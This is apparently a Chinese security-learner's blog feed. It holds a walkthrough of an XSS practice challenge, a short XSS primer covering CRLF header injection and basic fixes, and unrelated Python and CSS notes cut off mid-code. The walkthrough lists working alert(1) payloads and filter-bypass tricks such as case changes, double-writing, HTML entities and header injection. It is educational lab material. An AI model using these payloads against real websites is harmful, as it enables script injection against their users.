</figure><h3 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669039155180.jpg?raw=true" alt title>                </div>                <div class="image-caption"></div>            </figure><p>查看网页源代码，还是跟上题差不多，不过是单引号换成了双引号。按照原来的思路，构造payload：<br><code>&quot; onclick=&quot;alert(1)</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669038872074.jpg?raw=true" alt title>                </div>                <div class="image-caption"></div>            </figure><h3 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h3><p>看网页源代码，跟上题一样，直接先测试上题的payload。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669042011764.jpg?raw=true" alt title>                </div>                <div class="image-caption"></div>            </figure><p><code>&lt;input name=keyword  value=&quot;&quot; o_nclick=&quot;alert(1)&quot;&gt;</code>再次查看，可以看出对on进行了过滤，在尝试双写、改变大小写无果后。换思路看看<code>&lt; &gt;</code>是否过滤，发现没有过滤。然后考虑先闭合input标签，然后构造个超链接，点击后调用js事件。<br>payload=<code>&quot;&gt; &lt;a href=&quot;javascript:alert(1)&quot;&gt;1&lt;/a&gt;</code><br>然后点击就ok了。</p><h3 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h3><p>第六关直接测试上题的payload，无法通过，然后看网页源代码：<br><code>&lt;input name=keyword  value=&quot;&quot;&gt; &lt;a hr_ef=&quot;javascript:alert(1)&quot;&gt;1&lt;/a&gt;&quot;&gt;</code><br>发现href遭到了过滤，结果发现改变大小写可以绕过。<br>payload：<code>&quot;&gt; &lt;a hRef=&quot;javascript:alert(1)&quot;&gt;1&lt;/a&gt;</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669054032946.jpg?raw=true" alt title>                </div>                <div class="image-caption"></div>            </figure><h3 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h3><p>还是先测试上题的payload，然后查看源代码，发现：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669056409336.jpg?raw=true" alt title>                </div>                <div class="image-caption"></div>            </figure><p>href与script直接被替换成了空，然后考虑双写绕过，构造payload：<code>&quot;&gt; &lt;a hrhrefef=&quot;javascriscriptpt:alert(1)&quot;&gt;1&lt;/a&gt;</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669055755331.jpg?raw=true" alt title>                </div>                <div class="image-caption"></div>            </figure><h3 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669060160351.jpg?raw=true" alt title>                </div>                <div class="image-caption"></div>            </figure><p>发现有些不一样了，然后先点下”添加友情链接“按钮，去看下网页源代码。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669060975749.jpg?raw=true" alt title>                </div>                <div class="image-caption"></div>            </figure><p>会发现这个题是在这个地方来进行xss攻击。先构造payload：<code>javascript:alert(1)</code>，无法通过，然后查看源代码<code>&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;javascr_ipt:alert(1)&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;</code>可以发现其过滤了字符串script，因为此处为html标记语言，考虑把”r”转换为HTML实体来绕过。<br>构造payload：<code>javasc&amp;#114;ipt:alert(1)</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669059745275.jpg?raw=true" alt title>                </div>                <div class="image-caption"></div>            </figure><h3 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669066979885.jpg?raw=true" alt title>                </div>                <div class="image-caption"></div>            </figure><p>这题还是跟上题一个类型，但是发现不管加入什么都显示这个。不如加入个正常合法链接试一试，<code>http://www.baidu.com</code>,发现显示正常了，经过测试后发现其在检测到<code>http://</code>后才会正常显示你的代码。所以构造payload：<code>javasc&amp;#114;ipt:alert(1)//http://</code><br>注意”//“这个是来注释后面的代码的。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669068046610.jpg?raw=true" alt title>                </div>                <div class="image-caption"></div>            </figure><h3 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669071677201.jpg?raw=true" alt title>                </div>                <div class="image-caption"></div>            </figure><p>进来以后发现无任何可输入的地方，然后就查看源代码<figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669072118291.jpg?raw=true" alt title>                </div>                <div class="image-caption"></div>            </figure></p><p>发现其type类型全是hidden，然后考虑是不是考察这个知识点，在查询后发现大多解决办法就是把hidden，改为text类型。因为在浏览器get到<code>type=”***“</code>，即可把原来的type给替换所以考虑构造payload：<br><code>&amp;t_sort=&quot; type=&quot;text&quot; onclick=&quot;alert()</code><br>然后会出现个输入框，点击后即可过关。<strong>此处需要注意的是查看源代码后发现有三个input标签，但实际测试只有最后一个<code>name=&quot;t_sort&quot;</code>才会出现文本框，所以构造了以最后一个标签为攻击点的payload。</strong></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669081314821.jpg?raw=true" alt title>                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669077403237.jpg?raw=true" alt title>                </div>                <div class="image-caption"></div>            </figure><h3 id="第十一关至第十三关"><a href="#第十一关至第十三关" class="headerlink" title="第十一关至第十三关"></a>第十一关至第十三关</h3><p>这几关都是http头注入需要抓包来完成，基本大差不差的。<br>第十一关 Referer</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669099835862.jpg?raw=true" alt title>                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669091402139.jpg?raw=true" alt title>                </div>                <div class="image-caption"></div>            </figure><p>第十二关 ua</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669102310614.jpg?raw=true" alt title>                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669101896563.jpg?raw=true" alt title>                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669101286592.jpg?raw=true" alt title>                </div>                <div class="image-caption"></div>            </figure><p>第十三关 cookie</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669103883723.jpg?raw=true" alt title>                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669103999546.jpg?raw=true" alt title>                </div>                <div class="image-caption"></div>            </figure><p>明显是cookie注入了</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669104596197.jpg?raw=true" alt title>                </div>                <div class="image-caption"></div>            </figure><h3 id="第十四至最后"><a href="#第十四至最后" class="headerlink" title="第十四至最后"></a>第十四至最后</h3><p>这几道题基本都是看着别人的博客才做的下来，并且做了感觉不是太明白原理，就先不总结了。以后学到更深的再进行总结。</p><h2 id="绕过姿势小补充"><a href="#绕过姿势小补充" class="headerlink" title="绕过姿势小补充"></a>绕过姿势小补充</h2><h3 id="“-”被过滤"><a href="#“-”被过滤" class="headerlink" title="“()”被过滤"></a>“()”被过滤</h3><p>用” ` “ 字符了来代替括号。</p><p>payload: alert`1`</p><h4 id="小进阶-“-“-“-”同时被过滤"><a href="#小进阶-“-“-“-”同时被过滤" class="headerlink" title="小进阶 “ ` “ “()”同时被过滤"></a>小进阶 “ ` “ “()”同时被过滤</h4><p>可以使用 <code>&lt;svg&gt;</code> 标签，其有一个特性就是可以执行HTML实体代码。用法是<code>&lt;svg&gt;&amp;#数字;</code><br>所以构造payload:<br><code>&lt;svg&gt;&lt;script&gt;alert&amp;#40;1&amp;#41;&lt;/script&gt;&lt;/svg&gt;</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;XSS挑战之旅&quot;&gt;&lt;a href=&quot;#XSS挑战之旅&quot; class=&quot;headerlink&quot; title=&quot;XSS挑战之旅&quot;&gt;&lt;/a&gt;XSS挑战之旅&lt;/h1&gt;&lt;h2 id=&quot;关卡&quot;&gt;&lt;a href=&quot;#关卡&quot; class=&quot;headerlink&quot; title=&quot;关
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>XSS知识简单学习</title>
    <link href="https://chumen77.github.io/2019/08/16/xss%E5%AD%A6%E4%B9%A0/"/>
    <id>https://chumen77.github.io/2019/08/16/xss学习/</id>
    <published>2019-08-16T08:21:01.000Z</published>
    <updated>2019-08-20T12:40:31.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XSS知识简单学习"><a href="#XSS知识简单学习" class="headerlink" title="XSS知识简单学习"></a>XSS知识简单学习</h1><h2 id="一-Xss简介"><a href="#一-Xss简介" class="headerlink" title="一:Xss简介"></a>一:Xss简介</h2><p>XSS攻击全称<strong>跨站脚本攻击</strong>，是为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS，XSS是一种在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中比如这些代码包括HTML代码和客户端脚本。攻击者利用XSS漏洞旁路掉访问控制——例如同源策略(same origin policy)。这种类型的漏洞由于被黑客用来编写危害性更大的网络钓鱼(Phishing)攻击而变得广为人知。对于跨站脚本攻击，黑客界共识是：跨站脚本攻击是新型的“缓冲区溢出攻击“，而JavaScript是新型的“ShellCode”。</p><p>##二：ajax简介<br>ajax其实就是异步JavaScript和xml，其最大优势在于可以实现异步访问。<br>为什么要用AJAX，首先它够隐秘，也就是所谓的“无刷新”，其次，它能更有效地迅速处理各种复杂多变的数据。其可以实现异步更新和跨域。</p><h2 id="三：xss漏洞分类"><a href="#三：xss漏洞分类" class="headerlink" title="三：xss漏洞分类"></a>三：xss漏洞分类</h2><h3 id="存储XSS"><a href="#存储XSS" class="headerlink" title="存储XSS"></a>存储XSS</h3><p>存储XSS,会把攻击者的数据存储在服务器端，攻击行为将伴随着攻击数据一直存在。也就是提交JS攻击代码存储到数据库然后再输出。</p><p>用户输入的地方最容易滋生XSS，譬如留言、评论等表单，一个的留言本，因为没有对用户输入的变量作出合适的过滤，导致一个XSS的产生。留言率先传递给管理员，当作javascript劫持，我们就可以利用管理员的权限做任何事情。当内容通过审核，发布到网站，此时所有的web浏览用户都有可能受到XSS，我们能获得更多的会话劫持。 </p><h3 id="反射型XSS攻击"><a href="#反射型XSS攻击" class="headerlink" title="反射型XSS攻击"></a>反射型XSS攻击</h3><p>反射型XSS攻击也是非持久型XSS攻击，其是一次性的，仅对当次的页面访问产生影响。非持久型XSS攻击要求用户访问一个被攻击者篡改后的链接，用户访问该链接时，被植入的攻击脚本被用户游览器执行，从而达到攻击目的，其是经过服务器的。</p><p>其需要黑客进行诱骗使用户访问这个带有xss攻击的链接后，便被JavaScript劫持，收到攻击。</p><h3 id="Dom-xss"><a href="#Dom-xss" class="headerlink" title="Dom-xss"></a>Dom-xss</h3><p>通过URL传入参数所触发，<strong>其不与服务器进行通信</strong>，但是我们的js攻击代码可以被执行，这是需要分析页面源码然后进行利用，是存在客户端页面的脚本自身中。</p><h2 id="四：X-XSS-Protection"><a href="#四：X-XSS-Protection" class="headerlink" title="四：X-XSS-Protection"></a>四：X-XSS-Protection</h2><p>是浏览器对xxs防护的一个策略，这个可以通过抓包软件，修改头来进行绕过。<br>筒単一句活:<br><code>header(&quot;X-XSS-Protection: 0&quot;);告泝浏览器禁用XSS保枦header(&quot;X-XSS-Protection: 1&quot;);告泝浏览器幵宕XSS保枦</code></p><h2 id="五：CRLF响应头注入"><a href="#五：CRLF响应头注入" class="headerlink" title="五：CRLF响应头注入"></a>五：CRLF响应头注入</h2><p><code>Location: http://****%0d%0aX-XSS-Protection: 0</code><br>就是相当于<br><code>Location: http://****XSS-Protection: 0</code><br>这就是一个注入，又添加了一个响应头。<br>但是这种漏洞在php版本&gt;5.1时候是不行的，因为其不允许在HTTP头中出现两个属性。<br>应用场景：</p><ul><li>php&lt;5.1</li><li>碰到了服务器开启xss拦截</li></ul><h2 id="六：修补xss漏洞（简单）"><a href="#六：修补xss漏洞（简单）" class="headerlink" title="六：修补xss漏洞（简单）"></a>六：修补xss漏洞（简单）</h2><h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h3><p>例如 &gt; &lt; Script等等字眼</p><h3 id="转义"><a href="#转义" class="headerlink" title="转义"></a>转义</h3><p>利用php函数 htmlentities()把字符转换为HTML实体</p><h2 id="七：闭合xss"><a href="#七：闭合xss" class="headerlink" title="七：闭合xss"></a>七：闭合xss</h2><p>当你的js代码被浏览器直接显示出来后，考虑是否是其源码里对你的js代码做了textarea标签处理，然后就需要我们去闭合这个textarea标签，比较通用的就是<code>&#39;&quot;&gt;&lt;/textarea&gt;</code>+js代码 即可。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;XSS知识简单学习&quot;&gt;&lt;a href=&quot;#XSS知识简单学习&quot; class=&quot;headerlink&quot; title=&quot;XSS知识简单学习&quot;&gt;&lt;/a&gt;XSS知识简单学习&lt;/h1&gt;&lt;h2 id=&quot;一-Xss简介&quot;&gt;&lt;a href=&quot;#一-Xss简介&quot; class=&quot;he
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>简易解决python2.X与python3.x共存问题</title>
    <link href="https://chumen77.github.io/2019/04/02/%E7%AE%80%E6%98%93%E8%A7%A3%E5%86%B3python2.X%E4%B8%8Epython3.x%E5%85%B1%E5%AD%98%E9%97%AE%E9%A2%98/"/>
    <id>https://chumen77.github.io/2019/04/02/简易解决python2.X与python3.x共存问题/</id>
    <published>2019-04-02T15:05:47.000Z</published>
    <updated>2019-04-29T14:56:51.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简易解决python2-X与python3-x共存问题"><a href="#简易解决python2-X与python3-x共存问题" class="headerlink" title="简易解决python2.X与python3.x共存问题"></a>简易解决python2.X与python3.x共存问题</h1><p>python3.x不兼容Python2.x，语法有许多不同，但很多工具还是需要2.x版本，自己又是初学者，只是跑跑别人的脚本，不会改语法冲突。。。。下面说解决办法。</p><h2 id="安装模块"><a href="#安装模块" class="headerlink" title="安装模块"></a>安装模块</h2><p>Python目前还是需要分开安装</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py <span class="number">-2</span> -m pip install xxxx</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py <span class="number">-3</span> -m pip install xxxx</span><br></pre></td></tr></table></figure><h2 id="运行脚本"><a href="#运行脚本" class="headerlink" title="运行脚本"></a>运行脚本</h2><p>分别用py2.x py3.x运行一个1.py的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py <span class="number">-2</span> <span class="number">1.</span>py</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py -3 1.py</span><br></pre></td></tr></table></figure><p>或者在1.py的文件代码头加上<code>#! python3</code>  <code>#! python2</code>看个人的情况。</p><p>这样就直接输入：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py <span class="number">1.</span>py</span><br></pre></td></tr></table></figure><p>这只是解决了简单的<strong><u>安装模块和运行脚本</u></strong>的问题。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;简易解决python2-X与python3-x共存问题&quot;&gt;&lt;a href=&quot;#简易解决python2-X与python3-x共存问题&quot; class=&quot;headerlink&quot; title=&quot;简易解决python2.X与python3.x共存问题&quot;&gt;&lt;/a&gt;简易解决p
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>css学习</title>
    <link href="https://chumen77.github.io/2019/03/30/css%E5%AD%A6%E4%B9%A0/"/>
    <id>https://chumen77.github.io/2019/03/30/css学习/</id>
    <published>2019-03-30T14:48:12.000Z</published>
    <updated>2019-08-04T04:09:51.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h1><h2 id="如何使用CSS"><a href="#如何使用CSS" class="headerlink" title="如何使用CSS"></a>如何使用CSS</h2><p>CSS<br>可以通过以下方式添加到HTML中:</p><ol><li>内联样式- 在HTML元素中使用”style” <strong>属性 (不推荐使用)；</strong></li><li>内部样式表 -在HTML文档头部 <code>&lt;head&gt;</code> 区域使用<code>&lt;style&gt;</code><strong>元素</strong> 来包含CSS。</li><li>外部引用 - 使用外部 CSS <strong>文件</strong>(==推荐使用)==</li></ol><h4 id="内联样式"><a href="#内联样式" class="headerlink" title="内联样式"></a>内联样式</h4><p>应用到个别元素时，就可以使用内联样式。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"color: red;width: 100px; height: 100px; background: yellow"</span>&gt;</span>苹果<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="内部样式表"><a href="#内部样式表" class="headerlink" title="内部样式表"></a>内部样式表</h4><p>当单个文件需要特别样式时，就可以使用<strong>内部样式表</strong>。你可以在<code>&lt;head&gt;</code> 部分通过 <code>&lt;style&gt;</code>标签定义内部样式表:。也推荐这样使用便于更改全局。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">div&#123;</span></span><br><span class="line"><span class="undefined">color: red;</span></span><br><span class="line"><span class="undefined">width: 100px; </span></span><br><span class="line"><span class="undefined">height: 100px;</span></span><br><span class="line"><span class="undefined">            background: yellow</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>注：在头文件写的时候 style还是个开闭标签。</strong></p><h4 id="外部样式表"><a href="#外部样式表" class="headerlink" title="外部样式表"></a>外部样式表</h4><p>用<code>&lt;link&gt;</code>当样式需要被应用到很多页面的时候，外部样式表将是理想的选择。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">href</span>=<span class="string">"mystyle.css"</span>&gt;</span>   </span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>其中“rel=”stylesheet” type=”text/css””这是固定的,”mystyle.css”这是css的地址；</strong></p><h4 id="练习："><a href="#练习：" class="headerlink" title="练习："></a><strong>练习：</strong></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>css三种引入方式<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- &lt;style&gt;</span></span><br><span class="line"><span class="comment">div&#123;</span></span><br><span class="line"><span class="comment">color: red;</span></span><br><span class="line"><span class="comment">width: 100px; </span></span><br><span class="line"><span class="comment">height: 100px;</span></span><br><span class="line"><span class="comment">            background: yellow</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">&lt;/style&gt; --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"1.css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!-- &lt;div style="color: red;width: 100px; height: 100px; background: yellow"&gt;苹果&lt;/div&gt; --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span>&gt;</span> 苹果1<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">div&#123;</span><br><span class="line">color: red;</span><br><span class="line">width: 100px; </span><br><span class="line">height: 100px;</span><br><span class="line">    background: yellow</span><br><span class="line">&#125;   <span class="comment">&lt;!-- 1.css --&gt;</span></span><br></pre></td></tr></table></figure><p><strong>效果：</strong></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://github.com/chumen77/chumen77.github.io/blob/master/tuchuang/css1.jpg?raw=true" alt="CSS 语法" title>                </div>                <div class="image-caption">CSS 语法</div>            </figure><h2 id="CSS-语法"><a href="#CSS-语法" class="headerlink" title="CSS 语法"></a>CSS 语法</h2><h4 id="CSS-语法规则"><a href="#CSS-语法规则" class="headerlink" title="CSS 语法规则"></a>CSS 语法规则</h4><p>由两个主要的部分构成：选择器，以及一条或多条声明:</p><ul><li>选择器通常是您需要改变样式的 HTML 元素。</li><li>每条声明由一个属性和一个值组成。</li><li>属性是您希望设置的样式属性。每个属性有一个值。属性和值被冒号分开。</li><li>CSS声明总是以分号(;)结束，声明组以大括号({})括起来</li></ul><p>例：<code>h1{ color:blue; font-size :12px;}</code></p><p>其中h1 为选择器 color 是属性 blue是值。</p><h4 id="CSS-注释："><a href="#CSS-注释：" class="headerlink" title="CSS 注释："></a><strong>CSS 注释</strong>：</h4><p>CSS注释以 “<strong>/*</strong>“ 开始, 以 “<strong>*/</strong>“ 结束。</p><h4 id="颜色："><a href="#颜色：" class="headerlink" title="颜色："></a>颜色：</h4><p>颜色属性被用来设置文字的颜色。</p><p>颜色是通过CSS最经常的指定：</p><ul><li>十六进制值 - 如: <strong>＃FF0000</strong></li><li>一个RGB值 - 如: <strong>RGB(255,0,0)</strong></li><li>颜色的名称 - 如: <strong>red</strong></li></ul><p><strong>常用的</strong>：<strong>rgb：</strong>：r是红色，g是绿色，b是蓝色。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">body &#123;color:red;&#125;  </span><br><span class="line">h1 &#123;color:#00ff00;&#125;   /* 可以写成 #0f0 */</span><br><span class="line">h2 &#123;color:rgb(255,0,0);&#125;   /* 0-255 */ 是其颜色深浅</span><br></pre></td></tr></table></figure><p>==<strong>注</strong> - 所有浏览器都不支持颜色的rgb（）属性，因此建议不要使用它。==</p><h2 id="CSS选择器"><a href="#CSS选择器" class="headerlink" title="CSS选择器"></a>CSS选择器</h2><p><strong>基本选择器</strong>：</p><ul><li><strong>id 选择器</strong>：可以为标有特定 id 的 HTML 元素指定特定的样式。HTML元素以<strong>id属性</strong>来设置id选择器,CSS 中 id 选择器以 <strong>“#”</strong> 来定义。（==ID属性不要以数字开头==）</li><li><strong>class 选择器</strong>：class 选择器用于描述<strong>一组元素的样式</strong>，class 选择器有别于id选择器，class可以在多个元素中使用。 例：<code>&lt;p class=&quot;txt txt2&quot;&gt;aaa&lt;/p&gt;</code>  。class 选择器在HTML中以<strong>class属性</strong>表示, 在 CSS 中，类选择器以一个点<strong>“.”</strong>号显示</li><li><code>*</code>通配符：全部标签属性的都会有效果。</li><li><strong>标签 div</strong>：div标签 的会有效果。</li></ul><p><strong>练习</strong>：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>css选择器<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">href</span>=<span class="string">"1.css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>div111</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>div222<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"txt"</span>&gt;</span>the way i am<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"txt1 txt2"</span>&gt;</span>song<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>css：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span 